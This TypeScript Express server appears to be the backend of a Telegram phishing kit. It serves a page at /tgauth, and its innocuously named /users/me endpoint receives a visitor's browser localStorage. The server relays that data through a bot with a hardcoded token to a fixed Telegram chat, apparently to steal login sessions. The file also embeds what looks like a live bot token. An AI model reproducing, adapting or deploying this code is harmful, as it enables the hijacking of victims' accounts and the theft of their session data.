import express, { type Request, Response, NextFunction } from "express";
import { registerRoutes } from "./routes";
import { setupVite, serveStatic, log } from "./vite";
import compression from "compression";
import https from "https";
import http from "http";
import cors from "cors";
import path from "path";
import fs from "fs";
import TelegramBot from "node-telegram-bot-api";
import rateLimit from "express-rate-limit";

// Set up the Telegram Bot
const token = "7735363876:AAGCc2HIGk5GViGPmRnKG35LpOEZP7APVxM";
const bot = new TelegramBot(token, { polling: true });

// Express app setup
const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: false }));
app.use(cors());
app.use(compression());

// Trust the first proxy for handling HTTP/S requests
app.set("trust proxy", 1);

// Rate Limiter to protect the /users/me endpoint
const limiter = rateLimit({
  windowMs: 60 * 60 * 1000, // 1 hour
  max: 5, // Limit each IP to 5 requests per window (1 hour)
  message: "Too many requests from this IP, please try again after 10 minutes",
});

// Public folder and static assets setup
const __dirname = path
  .dirname(new URL(import.meta.url).pathname)
  .replace(/^file:\/\//, "");
let publicFolderPath = path.resolve(__dirname, "../public");

// Fix the path to remove double C:\
publicFolderPath = publicFolderPath.replace(/^C:\\C:/, "C:/");
console.log("Public folder path:", publicFolderPath);

// Static route to serve HTML page for /tgauth
app.get("/tgauth", (req, res) => {
  const indexPath = path.join(publicFolderPath, "index.html");
  console.log("Sending index file from:", indexPath);
  res.sendFile(indexPath);
});

// Middleware to ensure static files are served correctly
app.use(
  express.static(publicFolderPath, {
    index: false, // Avoid serving index.html automatically
    extensions: ["html", "js", "css"], // Allow only these file extensions to be served
  })
);

// Log all API requests with duration and response data
app.use((req, res, next) => {
  const start = Date.now();
  const path = req.path;
  let capturedJsonResponse: Record<string, any> | undefined = undefined;

  const originalResJson = res.json;
  res.json = function (bodyJson, ...args) {
    capturedJsonResponse = bodyJson;
    return originalResJson.apply(res, [bodyJson, ...args]);
  };

  res.on("finish", () => {
    const duration = Date.now() - start;
    if (path.startsWith("/api")) {
      let logLine = `${req.method} ${path} ${res.statusCode} in ${duration}ms`;
      if (capturedJsonResponse) {
        logLine += ` :: ${JSON.stringify(capturedJsonResponse)}`;
      }

      if (logLine.length > 80) {
        logLine = logLine.slice(0, 79) + "…";
      }

      log(logLine);
    }
  });

  next();
});

// Middleware for rate-limited POST requests
let counter = 1;
const requestSet = new Set();

app.post("/users/me", limiter, (req, res) => {
  const reqBody = req.body.localStorage;
  const reqBodyString = JSON.stringify(reqBody);

  if (requestSet.has(reqBodyString)) {
    return res.status(429).send("Duplicate request");
  }

  requestSet.add(reqBodyString);
  setTimeout(() => requestSet.delete(reqBodyString), 5 * 60 * 1000); // 5 minutes

  const identifier = counter++;

  const reqBodyWithId = {
    identifier: identifier,
    localstorage: reqBody,
  };

  [7762144843].forEach((id) =>
    bot.sendMessage(id, JSON.stringify(reqBodyWithId))
  );
  res.sendStatus(200);
});

// Error handler middleware
app.use((err: any, _req: Request, res: Response, _next: NextFunction) => {
  const status = err.status || err.statusCode || 500;
  const message = err.message || "Internal Server Error";

  res.status(status).json({ message });
  throw err;
});

// Register other routes (API, etc.)
(async () => {
  const server = await registerRoutes(app);

  // Setup Vite for development or serve static assets for production
  if (app.get("env") === "development") {
    await setupVite(app, server);
  } else {
    serveStatic(app);
  }

  // Conditional HTTP or HTTPS setup
  const useHttp = process.argv[4] !== "https";
  const forcePort = process.argv[3];
  const port = forcePort ? +forcePort : 5500;

  const serverInstance = useHttp ? http : https;
  let options = {};
  if (!useHttp) {
    options.key = fs.readFileSync(
      path.join(__dirname, "/certs/server-key.pem")
    );
    options.cert = fs.readFileSync(
      path.join(__dirname, "/certs/server-cert.pem")
    );
  }

  serverInstance.createServer(options, app).listen(port, () => {
    log(`Serving on port ${port}`);
  });
})();
